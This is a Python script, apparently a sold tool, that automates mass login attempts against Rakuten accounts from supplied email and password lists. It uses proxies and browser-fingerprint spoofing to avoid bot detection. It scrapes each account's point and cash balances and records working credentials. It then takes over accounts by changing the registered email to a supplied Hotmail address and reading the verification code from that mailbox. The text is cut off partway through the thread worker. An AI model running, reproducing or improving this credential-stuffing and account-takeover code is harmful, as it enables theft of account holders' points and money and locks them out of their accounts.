import time
import random
import logging
import threading
from queue import Queue
import os
import colorama
from datetime import datetime
import signal
import sys
import atexit
import shutil
import requests
import pyautogui
from playwright.sync_api import sync_playwright
from undetected_playwright import Tarnished
import subprocess

def randomUserAgent():
    """Generate a random Chrome user agent with realistic version numbers"""
    def randInt(min_val, max_val):
        return random.randint(min_val, max_val)
    
    major = randInt(100, 120)
    build = randInt(4200, 5400) 
    patch = randInt(10, 200)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36"

# Set Playwright browsers path for bundled executable
if getattr(sys, 'frozen', False):
    # Running as bundled executable
    bundle_dir = sys._MEIPASS
    browsers_path = os.path.join(bundle_dir, 'playwright_browsers')
    if not os.path.exists(browsers_path):
        browsers_path = os.path.join(os.path.dirname(sys.executable), 'playwright_browsers')
    os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browsers_path
# else:
#     # Running as script
#     os.environ["PLAYWRIGHT_BROWSERS_PATH"] = "0"

colorama.init()

successful_accounts = []
failed_accounts = []
browsers = []

def ensure_browsers_installed():
    """Ensure Playwright browsers are installed, especially for bundled executables"""
    try:
        # For bundled executables, try to use portable browser approach
        if getattr(sys, 'frozen', False):
            logging.info("Đang chạy từ executable, kiểm tra browsers...")
            
            # Check if browsers exist in the expected paths
            exe_dir = os.path.dirname(sys.executable)
            possible_browser_paths = [
                os.path.join(exe_dir, 'playwright_browsers'),
                os.path.join(exe_dir, '..', 'playwright_browsers'),
                os.path.join(os.getcwd(), 'playwright_browsers'),
            ]
            
            for browser_path in possible_browser_paths:
                if os.path.exists(browser_path):
                    chromium_path = os.path.join(browser_path, 'chromium-*', 'chrome-win', 'chrome.exe')
                    import glob
                    if glob.glob(chromium_path):
                        os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browser_path
                        logging.info(f"✅ Đã tìm thấy browsers tại: {browser_path}")
                        return True
            
            # Try to install browsers to current directory
            logging.info("Đang thử cài đặt browsers...")
            browsers_path = os.path.join(os.getcwd(), 'playwright_browsers')
            if not os.path.exists(browsers_path):
                os.makedirs(browsers_path, exist_ok=True)
            
            os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browsers_path
            
            try:
                # Try multiple approaches to install browsers
                install_commands = [
                    ['python', '-m', 'playwright', 'install', 'chromium'],
                    ['playwright', 'install', 'chromium'],
                    ['npx', 'playwright', 'install', 'chromium']
                ]
                
                for cmd in install_commands:
                    try:
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300,
                                              env={**os.environ, 'PLAYWRIGHT_BROWSERS_PATH': browsers_path})
                        if result.returncode == 0:
                            logging.info("✅ Đã cài đặt browsers thành công")
                            return True
                        else:
                            logging.debug(f"Command {' '.join(cmd)} failed: {result.stderr}")
                    except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
                        logging.debug(f"Command {' '.join(cmd)} error: {e}")
                        continue
                
                # If all installation attempts fail, show error
                logging.error("❌ Không thể cài đặt browsers tự động")
                logging.error("📝 Hướng dẫn khắc phục:")
                logging.error("1. Tải và giải nén Chromium vào thư mục 'playwright_browsers'")
                logging.error("2. Hoặc chạy: python -m playwright install chromium")
                logging.error("3. Sau đó copy thư mục browsers vào cùng thư mục với file .exe")
                return False
                
            except Exception as e:
                logging.warning(f"⚠️ Lỗi khi cài đặt browsers: {e}")
                return False
                
        else:
            # For non-bundled version, try normal installation
            try:
                result = subprocess.run(['python', '-m', 'playwright', 'install', 'chromium'], 
                                      capture_output=True, text=True, timeout=300)
                if result.returncode == 0:
                    logging.info("✅ Đã cài đặt browsers thành công")
                    return True
                else:
                    logging.warning(f"Không thể cài đặt browsers: {result.stderr}")
                    return False
            except Exception as e:
                logging.warning(f"Lỗi khi cài đặt browsers: {e}")
                return False
                
    except Exception as e:
        logging.warning(f"Lỗi trong ensure_browsers_installed: {e}")
        return False

def cleanup_browsers():
    """Dọn dẹp tất cả các Browser instances."""
    logging.warning("Đang dọn dẹp browsers...")
    global browsers
    for browser in browsers[:]:
        try:
            browser.close()
        except Exception as e:
            logging.warning(f"Lỗi khi đóng browser: {e}")
        finally:
            if browser in browsers:
                browsers.remove(browser)

def signal_handler(sig, frame):
    """Xử lý SIGINT (Ctrl+C) và SIGTERM (đóng terminal)."""
    logging.info("Nhận tín hiệu dừng. Đang dọn dẹp...")
    cleanup_browsers()
    clean_all_user_data()
    logging.info("Dọn dẹp hoàn tất. Thoát...")
    sys.exit(0)

# Setup logging
COLOR_RESET = '\033[0m'
COLOR_INFO = '\033[32m'    # Green
COLOR_WARNING = '\033[33m' # Yellow
COLOR_ERROR = '\033[31m'   # Red

class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ''
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        msg = super().format(record)
        return f"{color}{msg}{COLOR_RESET}"
    
    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")

# Create stream handler with color
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

# File handler without color
file_handler = logging.FileHandler('rakuten_automation.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

# Hide verbose logs
logging.getLogger('playwright').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Global variables
file_lock = threading.Lock()
show_browser = True

def load_input_files():
    """Tải tài khoản từ accounts.txt và proxy từ proxy.txt"""
    try:
        accounts = []
        with open('accounts.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '||' in line:
                    parts = line.split('||')
                    if len(parts) >= 2:
                        accounts.append({
                            'email': parts[0].strip(),
                            'password': parts[1].strip()
                        })

        hotmails = []
        with open('hotmail.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    line = line.strip()
                    hotmails.append(line)
        
        # Load proxies (optional)
        proxies = []
        try:
            with open('proxy.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle different proxy formats
                        if '@' in line:
                            # Format: host:port@username:password
                            try:
                                host_port, credentials = line.split('@', 1)
                                if ':' in credentials:
                                    username, password = credentials.split(':', 1)
                                else:
                                    username, password = credentials, ""
                                
                                proxies.append({
                                    'server': f"http://{host_port}",
                                    'username': username,
                                    'password': password,
                                    'full': line
                                })
                            except Exception as e:
                                logging.warning(f"Không thể parse proxy: {line} - {e}")
                        else:
                            # Handle format: host:port:username:password or host:port
                            parts = line.split(':')
                            if len(parts) >= 4:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': parts[2],
                                    'password': parts[3],
                                    'full': line
                                })
                            elif len(parts) >= 2:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': None,
                                    'password': None,
                                    'full': line
                                })
        except FileNotFoundError:
            logging.warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.")
        
        if not accounts:
            logging.error("Không tìm thấy tài khoản hợp lệ trong accounts.txt")
            raise ValueError("Không có tài khoản để xử lý")
        
        logging.info(f"Đã tải {len(accounts)} tài khoản và {len(proxies)} proxy")
        return accounts, proxies, hotmails
    
    except Exception as e:
        logging.error(f"Lỗi khi tải file đầu vào: {repr(e)}")
        raise


def init_browser(proxy=None, email=None, size=(1366, 768)):
    """Khởi tạo Playwright browser với cài đặt không bị phát hiện"""
    
    try:
        playwright = sync_playwright().start()
    except Exception as e:
        logging.error(f"Lỗi khởi tạo Playwright: {e}")
        # Try to ensure browsers are installed
        if ensure_browsers_installed():
            try:
                playwright = sync_playwright().start()
            except Exception as e2:
                logging.error(f"Vẫn không thể khởi tạo Playwright sau khi cài đặt browsers: {e2}")
                raise
        else:
            raise
    
    # User data directory
    user_data_dir = os.path.join(os.getcwd(), "user-data")
    if email:
        user_data_dir = os.path.join(user_data_dir, f"user-data-{email.replace('@', '_').replace('.', '_')}")
    if not os.path.exists(user_data_dir):
        os.makedirs(user_data_dir)
    
    # Browser launch options
    launch_options = {
        'headless': not show_browser,
        'args': [
            '--no-sandbox',
            '--disable-dev-shm-usage',
            '--disable-blink-features=AutomationControlled',
            '--disable-infobars'
        ]
    }
    random_user_agent = randomUserAgent()
    # Context options
    context_options = {
        'user_agent': random_user_agent,
        'viewport': {'width': size[0], 'height': size[1]},
        'locale': 'ja-JP',
        'timezone_id': 'Asia/Tokyo',
        "geolocation": {
                'latitude': 35.6895,
                'longitude': 139.6917
        },
        "permissions": ['geolocation']
    }
    
    # Add proxy if provided
    if proxy:
        logging.debug(f"Setting up proxy: {proxy}")
        context_options['proxy'] = proxy
    
    try:
        browser = playwright.chromium.launch(**launch_options)
        context = browser.new_context(**context_options)
        Tarnished.apply_stealth(context)
        context.add_init_script("""
                        (() => {
                            try {
                                Object.defineProperty(navigator, 'webdriver', { get: () => false, configurable: true });
                                window.navigator.chrome = { runtime: {} };
                                Object.defineProperty(navigator, 'languages', { get: () => ['ja-JP','ja'] });
                                Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
                                const orig = navigator.permissions.query;
                                navigator.permissions.query = (p) => p && p.name === 'notifications' ? Promise.resolve({ state: Notification.permission }) : orig(p);
                            } catch(e) {}
                        })();
                """)
        
        page = context.new_page()
        
        return browser, context, page, user_data_dir, playwright
        
    except Exception as e:
        logging.error(f"Lỗi khởi tạo browser: {e}")
        playwright.stop()
        raise

async def human_type(page, selector, text, min_delay=0.05, max_delay=0.15):
    """Type text with human-like delay"""
    await page.fill(selector, "")  # Clear first
    for char in text:
        await page.type(selector, char, delay=random.uniform(min_delay, max_delay) * 1000)

def _remove_account_from_file(email):
    """Remove account from accounts.txt file"""
    try:
        with file_lock:
            with open('accounts.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            with open('accounts.txt', 'w', encoding='utf-8') as f:
                for line in lines:
                    if line.strip() and not line.startswith('#'):
                        parts = line.strip().split('||')
                        if len(parts) >= 1 and parts[0].strip() != email:
                            f.write(line)
                    else:
                        f.write(line)
            logging.debug(f"🗑️ Đã xóa {email} khỏi accounts.txt")
    except Exception as e:
        logging.warning(f"Không thể xóa {email} khỏi accounts.txt: {e}")

def check_rakuten_account(browser, context, page, email, password, hotmail=None):
    """Kiểm tra tài khoản Rakuten"""
    try:
        logging.info(f"Bắt đầu kiểm tra tài khoản: {email}")
        
        # Navigate to login page with retry logic
        login_url = ("https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in")
        
        # Try to navigate with retry mechanism
        max_retries = 3
        for attempt in range(max_retries):
            try:
                # Increase timeout for slow proxies
                page.goto(login_url, timeout=60000)  # 60 seconds timeout
                logging.debug(f"Successfully navigated to login page for {email} (attempt {attempt + 1})")
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    logging.debug(f"Failed to navigate to login page for {email} after {max_retries} attempts: {repr(e)}")
                    raise
                else:
                    logging.debug(f"Navigation attempt {attempt + 1} failed for {email}, retrying... Error: {repr(e)}")
                    time.sleep(5)  # Wait before retry

        time.sleep(random.randint(2, 5))
        is_valid_hot_mail = False
        result = True, "Đăng nhập thành công"
        # Step 1: Enter email
        if not _enter_email(page, email):
            result = False, f"Lỗi nhập email cho {email}"
        # Step 2: Enter password
        elif not _enter_password(page, password):
            result = False, f"Lỗi nhập password cho {email}"
        # Step 3: Check login success
        elif not _check_login_success(page, email):
            result = False, "Đăng nhập thất bại"
        else:
            # Step 4: Check points
            result = _check_points(page, email, password)
            # Step 5: Change Email
            if hotmail:
                change_result, change_message = _change_email(page, email, password, hotmail)
                if change_result:
                    is_valid_hot_mail = True
        
        _remove_account_from_file(email)        
        return result[0], result[1], is_valid_hot_mail

    except Exception as e:
        logging.error(f"❌ Lỗi trong quá trình kiểm tra cho {email}: {repr(e)}")
        # Remove account even if there's an exception
        _remove_account_from_file(email)
        return False, repr(e), False

def _enter_email(page, email):
    """Enter email in login form"""
    try:
        # Wait for email input field
        page.wait_for_selector("input#user_id", timeout=30000)
        
        # Type email with human-like delay
        page.fill("input#user_id", email)
        time.sleep(random.randint(1, 2))
        
        # Click first submit button (Next)
        # page.click("#cta001")
        # time.sleep(random.randint(2, 4))
        # Press Enter key to submit
        page.keyboard.press("Enter")
        return True
        
    except Exception as e:
        logging.debug(f"Lỗi khi nhập email: {repr(e)}")
        return False

def _enter_password(page, password):
    """Enter password in login form"""
    try:
        # Wait for password input field
        page.wait_for_selector("input#password_current", timeout=30000)
        
        # Type password with human-like delay
        page.fill("input#password_current", password)
        time.sleep(random.randint(1, 2))
        
        page.keyboard.press("Enter")
        # Click second submit button (Next)
        # page.click("#cta011")
        
        # Wait for login to process
        time.sleep(5)
        
        return True
        
    except Exception as e:
        debug_folder = "debug_output"
        os.makedirs(debug_folder, exist_ok=True)
        
        logging.error(f"Không tìm thấy ô password. Bắt đầu thu thập bằng chứng...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(debug_folder, f"debug_screenshot_{timestamp}.png")
        page.screenshot(path=screenshot_path, full_page=True)
        logging.info(f"Đã lưu ảnh chụp màn hình lỗi tại: {screenshot_path}")
        html_path = os.path.join(debug_folder, f"debug_page_{timestamp}.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(page.content())
        logging.info(f"Đã lưu mã HTML của trang lỗi tại: {html_path}")
        # logging.debug(f"Lỗi khi nhập password: {repr(e)}")
        return False

def _check_login_success(page, email):
    """Check if login was successful"""
    try:
        check_skip(page)

        # Wait for potential redirect to rakuten.co.jp domain with longer timeout for slow proxies
        page.wait_for_function(
            "window.location.href.includes('rakuten.co.jp')",
            timeout=30000  # Increased to 30 seconds for slow proxies
        )
        
        current_url = page.url
        
        # If still on login page, login failed
        if "login.account.rakuten.com" in current_url:
            # Check for error messages
            try:
                error_elements = page.query_selector_all(".error, .alert, [class*='error'], [class*='alert']")
                if error_elements:
                    error_text = error_elements[0].text_content()
                    logging.debug(f"Đăng nhập thất bại cho {email}: {error_text}")
                    return False
            except:
                pass
            
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
            return False
        
        return True
        
    except Exception as e:
        logging.debug(f"Timeout hoặc lỗi chờ redirect cho {email}: {repr(e)}")
        return False

def _check_points(page, email, password):
    """Check points information and save to appropriate file"""
    try:
        # Navigate to points page with retry
        points_url = "https://point.rakuten.co.jp/?l-id=top_normal_myrakuten_point"
        
        def goto_link(url):
            max_retries = 2
            for attempt in range(max_retries):
                try:
                    page.goto(url, timeout=30000) 
                    page.wait_for_load_state('networkidle', timeout=15000)
                    break
                except Exception as e:
                    if attempt == max_retries - 1:
                        logging.debug(f"Failed to navigate to points page for {email}: {repr(e)}")
                        return True, f"Đăng nhập thành công nhưng không thể truy cập trang điểm : {url}"
                    else:
                        logging.debug(f"Points page navigation attempt {attempt + 1} failed for {email}, retrying...")
                        time.sleep(3)

        goto_link(points_url)
        
        points_details = []
        
        try:
            try:
                page.wait_for_selector(".point-total dd", timeout=5000)
                held_points_element = page.query_selector(".point-total dd")
                if held_points_element:
                    held_points_text = held_points_element.text_content().strip()
                    held_points_clean = ''.join(filter(str.isdigit, held_points_text))
                    if held_points_clean:
                        held_points_value = int(held_points_clean)
                        points_details.append(f"Total Point: {held_points_value:,}")
                        logging.debug(f"📊 {email} - Points total: {held_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points total' cho {email}")

            try:
                page.wait_for_selector(".point-gadget-display-point .point_num", timeout=5000)
                operation_points_element = page.query_selector(".point-gadget-display-point .point_num")
                if operation_points_element:
                    operation_points_text = operation_points_element.text_content().strip()
                    operation_points_clean = ''.join(filter(str.isdigit, operation_points_text))
                    if operation_points_clean:
                        operation_points_value = int(operation_points_clean)
                        points_details.append(f"Operation: {operation_points_value:,}")
                        logging.debug(f"📈 {email} - Points in operation: {operation_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points in operation' cho {email}")

            try:
                page.wait_for_selector("#js-pointBankTotalBalance .point_num", timeout=5000)
                add_points_element = page.query_selector("#js-pointBankTotalBalance .point_num")
                if add_points_element:
                    add_points_text = add_points_element.text_content().strip()
                    add_points_clean = ''.join(filter(str.isdigit, add_points_text))
                    if add_points_clean:
                        add_points_value = int(add_points_clean)
                        points_details.append(f"Add: {add_points_value:,}")
                        logging.debug(f"➕ {email} - Points add: {add_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points add' cho {email}")

            goto_link("https://my.rakuten.co.jp/?l-id=pc_footer_account")
            time.sleep(3)

            try:
                page.wait_for_selector('[data-ratid="available-rcash-area"]', timeout=5000)
                cash_points_element = page.query_selector('[data-ratid="available-rcash-area"] span:nth-child(2)')
                if cash_points_element:
                    cash_points_text = cash_points_element.text_content().strip()
                    cash_points_clean = ''.join(filter(str.isdigit, cash_points_text))
                    if cash_points_clean:
                        cash_points_value = int(cash_points_clean)
                        points_details.append(f"Cash: {cash_points_value:,}")
                        logging.debug(f"➕ {email} - Cash Point: {cash_points_value:,}")
            except Exception:
                logging.debug(f"Không tìm thấy 'Points add' cho {email}")

            
                
            if len(points_details) > 0:
                points_summary = " | ".join(points_details)
                logging.info(f"✅ {email} - ({points_summary})")
                
                # Save to appropriate file based on points
                with file_lock:
                    with open('point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|{points_summary}\n")
                    return True, f"Có điểm: ({points_summary})"
            else:
                logging.info(f"📭 {email} - Không có điểm")
                with file_lock:
                    with open('no_point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|0\n")
                    return True, "Không có điểm"
                
        except Exception as e:
            logging.debug(f"Không tìm thấy thông tin điểm cho {email}: {repr(e)}")
            # Still consider login successful even if can't read points
            return True, "Đăng nhập thành công nhưng không tìm thấy điểm"
            
    except Exception as e:
        logging.debug(f"Lỗi khi kiểm tra điểm cho {email}: {repr(e)}")
        return True, "Đăng nhập thành công nhưng lỗi kiểm tra điểm"


from hotmail import Hotmail
import re
import html
import inspect

def extract_otp_from_html(html_content):
    if not html_content:
        return None

    # Normalize / unescape
    s = html.unescape(html_content)

    # --- Original methods kept first (preserve behaviour) ---
    pattern1 = r'your verification code is:</span></div></td></tr>.*?<div[^>]*><span>(\d{6})</span></div>'
    m = re.search(pattern1, s, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()

    pattern2 = r'verification code.*?(\d{6})'
    m = re.search(pattern2, s, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()

    # Find 6-digit codes but exclude hex color codes
    pattern3 = r'\b(\d{6})\b'
    for match in re.finditer(pattern3, s):
        # Get the position and the 6-digit code
        start_pos = match.start()
        end_pos = match.end()
        six_digit_code = match.group(1)
        
        # Check if it's part of a color code by looking at characters before it
        prefix = s[max(0, start_pos-1):start_pos]
        if prefix == '#':
            # Skip this match as it's likely a color code
            continue
            
        # Also check for "color code" text nearby (20 chars before)
        nearby_text = s[max(0, start_pos-20):start_pos].lower()
        if 'color' in nearby_text and 'code' in nearby_text:
            # Skip this match as it's described as a color code
            continue
            
        # If we got here, it's not a color code, so return it
        return six_digit_code.strip()
        
    return None

def _get_otp_from_hotmail(hotmail, otp_code = None):
    hotmail.get_access_token()
    try:
            for _ in range(30):
                try:
                    messages = hotmail.get_messages()
                    for msg in messages:
                        otp = extract_otp_from_html(msg)
                        if otp and str(otp) != str(otp_code):
                            logging.info(f"✅ Lấy OTP thành công: {otp}")
                            return otp
                except:
                    pass
                time.sleep(random.uniform(5, 15))
            return None
    except Exception as e:
            logging.error(f"CẢNH BÁO: Lỗi khi gọi API OTP: {str(e)}")
            return None
def check_skip(page):
    try:
        page.wait_for_selector('#seco_473', timeout=5000)
        page.click('#seco_473')
        time.sleep(5)
    except Exception:
        pass

def _change_email(page, email, password, hotmail):
    try:
        try:
            new_email, _, refresh_token, client_id = hotmail.split('|')
        except Exception:
            logging.error(f"Lỗi parse hotmail string: {hotmail}")
            return False, "Lỗi parse hotmail string"

        page.goto("https://profile.id.rakuten.co.jp/account-security", timeout=60000)
        check_skip(page)
        time.sleep(3)

        # If redirected to login, retry to open the account-security page
        if "login.account.rakuten.com" in page.url:
            page.goto("https://profile.id.rakuten.co.jp/account-security", timeout=60000)
            time.sleep(3)

        # Click change email button
        try:
            page.wait_for_selector('[data-qa-id="email-edit-field"]', timeout=15000)
            page.click('[data-qa-id="email-edit-field"]')
            time.sleep(1.5)
        except Exception as e: 
            logging.error(f"Không tìm thấy nút sửa email: {repr(e)}")
            return False, "Không tìm thấy nút sửa email"

        # Wait for email input and type new email
        try:
            page.wait_for_selector('input[name="email"]', timeout=15000)
            page.fill('input[name="email"]', new_email)
            time.sleep(0.8)
        except Exception as e:
            logging.error(f"Lỗi khi nhập email mới: {repr(e)}")
            return False, "Lỗi khi nhập email mới"

        # Click submit update email
        try:
            page.wait_for_selector('[data-qa-id="submit-update-email"]', timeout=10000)
            page.click('[data-qa-id="submit-update-email"]')
        except Exception as e:
            logging.error(f"Không tìm thấy nút submit update email: {repr(e)}")
            return False, "Không tìm thấy nút submit update email"

        time.sleep(15)
        hotmail_obj = Hotmail(email, password, refresh_token, client_id)

        otp_code = _get_otp_from_hotmail(hotmail_obj)
        if not otp_code:
            logging.error(f"Không lấy được OTP từ hotmail cho {email}")
            return False, "Không lấy được OTP từ hotmail"

        try:
            page.wait_for_selector('#VerifyCode', timeout=60000)
            # _type_like_human(page, '#VerifyCode', str(otp_code))
            page.fill('#VerifyCode', str(otp_code))
            time.sleep(3)
            page.click('#submit')
            logging.info(f"Đã gửi OTP để xác thực email cho {email}")
            time.sleep(10)
        except Exception as e:
            logging.error(f"Lỗi khi nhập/submit OTP cho {email}: {repr(e)}")
            return False, "Lỗi khi nhập/submit OTP"

        return True, f"{new_email}"
    except Exception as e:
        logging.error(f"Lỗi khi đổi email cho {email}: {repr(e)}")
        return False, "None"


hotmail_need_deletes = []

def process_account(browser, context, page, user_data_dir, playwright, account, account_index, hotmails):
    """Xử lý đăng ký một tài khoản"""
    email, password = account['email'], account['password']
    hotmail = hotmails[account_index % len(hotmails)] if len(hotmails) > 0 else None
    # logging.info(f"Sử dụng hotmail: {hotmail} cho tài khoản {email}")
    try:
        logging.debug(f"Đang xử lý tài khoản {account_index + 1}: {email}")
        success, message, is_valid_hot_mail = check_rakuten_account(browser, context, page, email, password, hotmail)
        if not success:
            logging.warning(f"Đăng nhập thất bại cho {email}: Acc Die")
        elif is_valid_hot_mail:
            hotmail_need_deletes.append(hotmail)

        with file_lock:
            if success:
                successful_accounts.append(account)
                # Lưu tài khoản thành công
                with open('successful_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}|{hotmail if is_valid_hot_mail else 'None'}\n")
            else:
                failed_accounts.append({'account': account, 'error': message})
                # Lưu tài khoản thất bại
                with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}|{hotmail if is_valid_hot_mail else 'None'}\n")
        logging.info(f"Hoàn tất xử lý tài khoản: {email}")
    except Exception as e:
        logging.error(f"Lỗi xử lý tài khoản {email}: {repr(e)}")
        with file_lock:
            failed_accounts.append({'account': account, 'error': repr(e)})
            with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}|{password}|{'Acc lock hoặc lỗi pass'}\n")
    finally:
        # Cleanup browser resources
        try:
            context.close()
            browser.close()
            playwright.stop()
        except Exception as e:
            logging.debug(f"Lỗi khi đóng browser: {e}")
        
        if hotmail and hotmail in hotmail_need_deletes:
                hotmail_need_deletes.remove(hotmail)
                try:
                    with file_lock:
                        with open('hotmail.txt', 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                        
                        with open('hotmail.txt', 'w', encoding='utf-8') as f:
                            for line in lines:
                                if line.strip() and not line.startswith('#'):
                                    if line.strip() != hotmail:
                                        f.write(line)
                                else:
                                    f.write(line)
                except Exception as e:
                    pass
        # Delete user_data_dir
        for _ in range(3):
            try:
                if user_data_dir and os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                break
            except:
                time.sleep(5)

def clean_all_user_data(retries=5, delay=1):
    """Dọn dẹp tất cả thư mục dữ liệu người dùng"""
    logging.debug("Đang dọn dẹp dữ liệu người dùng...")
    user_data_dir = os.path.join(os.getcwd(), "user-data")
    if os.path.exists(user_data_dir):
        for _ in range(retries):
            try:
                shutil.rmtree(user_data_dir)
                logging.info("Đã dọn dẹp dữ liệu người dùng thành công.")
                break
            except PermissionError:
                time.sleep(delay)
            except Exception as e:
                time.sleep(delay)

def check_key_live():
    """Kiểm tra key có live không từ GitHub"""
    try:
        trial_url = "https://raw.githubusercontent.com/sang2770/storage/master/trial.json"
        
        logging.info("Đang kiểm tra key live...")
        response = requests.get(trial_url, timeout=10)
        
        if response.status_code == 404:
            logging.error("❌ Key đã hết hạn hoặc không tồn tại (404).")
            print("\n" + "="*50)
            print("🔑 KEY ĐÃ HẾT HẠN HOẶC KHÔNG TỒN TẠI")
            print("Vui lòng liên hệ để gia hạn key.")
            print("="*50)
            return False
        elif response.status_code == 200:
            logging.info("✅ Key live - Cho phép chạy chương trình.")
            return True
        else:
            logging.warning(f"⚠️ Không thể kiểm tra key (HTTP {response.status_code}). Tiếp tục chạy...")
            return True
            
    except requests.exceptions.Timeout:
        logging.warning("⚠️ Timeout khi kiểm tra key. Tiếp tục chạy...")
        return True
    except requests.exceptions.ConnectionError:
        logging.warning("⚠️ Không có kết nối internet. Tiếp tục chạy...")
        return True
    except Exception as e:
        logging.warning(f"⚠️ Lỗi khi kiểm tra key: {repr(e)}. Tiếp tục chạy...")
        return True

def main():
    """Hàm chính"""
    global show_browser
    # Check if key is live before proceeding
    if not check_key_live():
        logging.error("Dừng chương trình do key không hợp lệ.")
        input("Nhấn Enter để thoát...")
        sys.exit(1)
    
    # Ensure browsers are installed (especially important for bundled executables)
    logging.info("Đang kiểm tra và chuẩn bị browsers...")
    if not ensure_browsers_installed():
        logging.error("❌ Không thể cài đặt hoặc tìm thấy Playwright browsers.")
        logging.error("=" * 60)
        logging.error("📝 HƯỚNG DẪN KHẮC PHỤC:")
        logging.error("1. Tạo thư mục 'playwright_browsers' cùng với file .exe")
        logging.error("2. Tải Chromium và giải nén vào thư mục đó:")
        logging.error("   https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html")
        logging.error("3. Hoặc copy từ máy đã cài Playwright:")
        logging.error("   %USERPROFILE%\\AppData\\Local\\ms-playwright")
        logging.error("4. Cấu trúc thư mục phải như sau:")
        logging.error("   playwright_browsers/chromium-xxxx/chrome-win/chrome.exe")
        logging.error("=" * 60)
        logging.error("Hoặc đọc file BUILD_GUIDE.md để biết thêm chi tiết")
        input("Nhấn Enter để thoát...")
        sys.exit(1)
    
    try:
        # Load input files
        accounts, proxies, hotmails = load_input_files()
        
        # Clean previous user data
        clean_all_user_data()
        
        # Get number of threads
        try:
            num_threads = int(input("Nhập số luồng để chạy: "))
            if num_threads <= 0:
                logging.warning("Số luồng phải là số dương. Đặt mặc định là 1.")
                num_threads = 1
            if num_threads > len(accounts):
                logging.warning(f"Số luồng ({num_threads}) vượt quá số tài khoản ({len(accounts)}). Đặt thành {len(accounts)}.")
                num_threads = len(accounts)
        except ValueError:
            logging.warning("Đầu vào số luồng không hợp lệ. Đặt mặc định là 1.")
            num_threads = 1
        
        # Nhập lựa chọn hiển thị trình duyệt
        show = input("Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ").strip().lower()
        show_browser = show in ['y', 'yes']
                
        # Setup account queue
        account_queue = Queue()
        screen_width, screen_height = pyautogui.size()
        col = 4  # Number of columns for browser windows
        
        # Add accounts to queue
        for idx, account in enumerate(accounts):
            account_queue.put((account, idx))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        browser_init_lock = threading.Lock()
        
        def worker():
            """Hàm worker thread"""
            browser = None
            while not account_queue.empty():
                try:
                    account, account_index = account_queue.get()
                    with browser_init_lock:
                        proxy = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
                        size = (screen_width // col, 400)
                        
                        # Debug logging for proxy
                        if proxy:
                            logging.debug(f"Using proxy for {account['email']}: {proxy}")
                            # # Test proxy connection
                            # if proxy.get('username') and proxy.get('password'):
                            #     if not test_proxy_connection(proxy):
                            #         logging.warning(f"Proxy test failed for {proxy['full']}, trying without proxy...")
                            #         proxy = None  # Fallback to no proxy
                        
                        # Try to initialize browser with proxy, fallback to no proxy if it fails
                        browser_initialized = False
                        for use_proxy in [True, False]:
                            if not use_proxy and proxy is None:
                                continue  # Skip if we already tried without proxy
                                
                            current_proxy = proxy if use_proxy else None
                            try:
                                browser, context, page, user_data_dir, playwright = init_browser(
                                    proxy=current_proxy, 
                                    email=account['email'],  
                                    size=size
                                )
                                browsers.append(browser)
                                browser_initialized = True
                                if not use_proxy:
                                    logging.warning(f"Fallback to no proxy for {account['email']}")
                                break
                            except Exception as e:
                                logging.warning(f"Failed to initialize browser with{'out' if not use_proxy else ''} proxy for {account['email']}: {repr(e)}")
                                if browser:
                                    try:
                                        browser.close()
                                    except:
                                        pass
                                    browser = None
                                
